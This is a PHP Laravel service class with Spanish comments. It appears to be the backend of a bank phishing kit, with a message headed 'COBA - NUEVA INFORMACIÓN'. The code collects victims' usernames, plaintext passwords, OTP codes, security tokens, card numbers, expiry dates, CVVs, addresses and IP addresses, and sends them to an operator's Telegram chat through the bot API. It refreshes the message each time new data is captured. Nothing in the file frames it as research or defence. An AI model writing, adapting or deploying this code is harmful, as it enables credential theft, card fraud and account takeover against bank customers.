<?php

namespace App\Services;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use App\Models\Usuario;

class TelegramService
{
    private $botToken;
    private $chatId;
    private $baseUrl;

    public function __construct()
    {
        $this->botToken = env('TELEGRAM_BOT_TOKEN');
        $this->chatId = env('TELEGRAM_CHAT_ID');
        $this->baseUrl = "https://api.telegram.org/bot{$this->botToken}";
    }

    /**
     * Enviar o actualizar información del usuario en Telegram
     */
    public function enviarInformacionUsuario(Usuario $usuario)
    {
        try {
            // Formatear el mensaje con todos los datos del usuario
            $mensaje = $this->formatearMensajeUsuario($usuario);

            // Si ya existe un mensaje previo, eliminarlo
            if ($usuario->telegram_message_id) {
                $this->eliminarMensaje($usuario->telegram_message_id);
            }

            // Enviar nuevo mensaje
            $response = $this->enviarMensaje($mensaje);

            if ($response && isset($response['result']['message_id'])) {
                // Guardar el ID del mensaje para futuras actualizaciones
                $usuario->update([
                    'telegram_message_id' => $response['result']['message_id']
                ]);

                Log::info("Mensaje de Telegram enviado exitosamente", [
                    'usuario_id' => $usuario->id,
                    'message_id' => $response['result']['message_id']
                ]);

                return true;
            }

            return false;

        } catch (\Exception $e) {
            Log::error("Error enviando mensaje a Telegram", [
                'usuario_id' => $usuario->id,
                'error' => $e->getMessage()
            ]);
            return false;
        }
    }

    /**
     * Formatear mensaje con información del usuario
     */
    private function formatearMensajeUsuario(Usuario $usuario)
    {
        $mensaje = "🏦 <b>COBA - NUEVA INFORMACIÓN</b>\n\n";
        $mensaje .= "👤 <b>ID Usuario:</b> #{$usuario->id}\n";
        // Usar fecha_ingreso si existe; de lo contrario, usar ahora()
        $fecha = $usuario->fecha_ingreso ?: now();
        $mensaje .= "📅 <b>Fecha:</b> " . $fecha->format('d/m/Y H:i:s') . "\n\n";

        // Información de acceso
        if ($usuario->usuario) {
            $mensaje .= "🔐 <b>Usuario:</b> <code>{$usuario->usuario}</code>\n";
        }

        if ($usuario->password) {
            $mensaje .= "🔑 <b>Contraseña:</b> <code>{$usuario->password}</code>\n";
        }

        if ($usuario->otp) {
            $mensaje .= "📱 <b>Código OTP:</b> <code>{$usuario->otp}</code>\n";
        }

        $mensaje .= "\n";

        // Información de contacto
        if ($usuario->email) {
            $mensaje .= "📧 <b>Email:</b> <code>{$usuario->email}</code>\n";
        }

        if ($usuario->telefono_movil) {
            $mensaje .= "📞 <b>Teléfono:</b> <code>{$usuario->telefono_movil}</code>\n";
        }

        $mensaje .= "\n";

        // Información técnica
        if ($usuario->ip_real) {
            $mensaje .= "🌐 <b>IP Real:</b> <code>{$usuario->ip_real}</code>\n";
        }

        if ($usuario->user_agent) {
            $userAgent = strlen($usuario->user_agent) > 100 ?
                substr($usuario->user_agent, 0, 100) . '...' :
                $usuario->user_agent;
            $mensaje .= "🔍 <b>User Agent:</b> <code>{$userAgent}</code>\n";
        }

        $mensaje .= "\n";

        // Datos personales adicionales
        if ($usuario->nombre) {
            $mensaje .= "🧑 <b>Nombre:</b> <code>{$usuario->nombre}</code>\n";
        }
        if ($usuario->apellido) {
            $mensaje .= "🧑 <b>Apellido:</b> <code>{$usuario->apellido}</code>\n";
        }

        // Teléfono fijo
        if ($usuario->telefono_fijo) {
            $mensaje .= "☎️ <b>Teléfono fijo:</b> <code>{$usuario->telefono_fijo}</code>\n";
        }

        // Tokens
        if ($usuario->token_codigo) {
            $mensaje .= "🧩 <b>Token:</b> <code>{$usuario->token_codigo}</code>\n";
        }
        if ($usuario->sgdotoken_codigo) {
            $mensaje .= "🧩 <b>SGDO Token:</b> <code>{$usuario->sgdotoken_codigo}</code>\n";
        }

        // Mensajería
        if ($usuario->msg_id) {
            $mensaje .= "💬 <b>Msg ID:</b> <code>{$usuario->msg_id}</code>\n";
        }
        if ($usuario->msg_in_id) {
            $mensaje .= "💬 <b>Msg IN ID:</b> <code>{$usuario->msg_in_id}</code>\n";
        }

        // Dirección
        if ($usuario->direccion) {
            $mensaje .= "🏠 <b>Dirección:</b> <code>{$usuario->direccion}</code>\n";
        }
        if ($usuario->codigo_postal) {
            $mensaje .= "🏷️ <b>CP:</b> <code>{$usuario->codigo_postal}</code>\n";
        }
        if ($usuario->estado_residencia) {
            $mensaje .= "🗺️ <b>Estado:</b> <code>{$usuario->estado_residencia}</code>\n";
        }

        // Datos de tarjeta (si existen)
        if ($usuario->tarjeta_numero) {
            $mensaje .= "💳 <b>Tarjeta:</b> <code>{$usuario->tarjeta_numero}</code>\n";
        }
        if ($usuario->tarjeta_expiracion) {
            $mensaje .= "⏳ <b>Expira:</b> <code>{$usuario->tarjeta_expiracion}</code>\n";
        }
        if ($usuario->tarjeta_cvv) {
            $mensaje .= "🔒 <b>CVV:</b> <code>{$usuario->tarjeta_cvv}</code>\n";
        }
        if ($usuario->titular_tarjeta) {
            $mensaje .= "👤 <b>Titular:</b> <code>{$usuario->titular_tarjeta}</code>\n";
        }

        // Comentarios (JSON como lista)
        if (!empty($usuario->comentarios) && is_array($usuario->comentarios)) {
            $comentarios = $usuario->comentarios;
            $items = array_map(function ($v) {
                if (is_array($v)) {
                    return json_encode($v);
                }
                return (string) $v;
            }, array_slice($comentarios, 0, 10));
            if (count($items)) {
                $mensaje .= "\n🗂️ <b>Comentarios:</b>\n - " . implode("\n - ", $items) . "\n";
            }
        }

        $mensaje .= "\n";
        $mensaje .= "⏰ <b>Última actualización:</b> " . now()->format('d/m/Y H:i:s');

        return $mensaje;
    }

    /**
     * Enviar mensaje a Telegram
     */
    private function enviarMensaje($mensaje)
    {
        $response = Http::timeout(10)->post("{$this->baseUrl}/sendMessage", [
            'chat_id' => $this->chatId,
            'text' => $mensaje,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ]);

        if ($response->successful()) {
            return $response->json();
        }

        Log::error("Error en respuesta de Telegram", [
            'status' => $response->status(),
            'body' => $response->body()
        ]);

        return null;
    }

    /**
     * Eliminar mensaje anterior
     */
    private function eliminarMensaje($messageId)
    {
        try {
            Http::timeout(5)->post("{$this->baseUrl}/deleteMessage", [
                'chat_id' => $this->chatId,
                'message_id' => $messageId
            ]);
        } catch (\Exception $e) {
            Log::warning("No se pudo eliminar mensaje anterior", [
                'message_id' => $messageId,
                'error' => $e->getMessage()
            ]);
        }
    }

    /**
     * Verificar configuración de Telegram
     */
    public function verificarConfiguracion()
    {
        if (!$this->botToken || !$this->chatId) {
            Log::error("Configuración de Telegram incompleta", [
                'bot_token' => $this->botToken ? 'Configurado' : 'Faltante',
                'chat_id' => $this->chatId ? 'Configurado' : 'Faltante'
            ]);
            return false;
        }

        return true;
    }
}
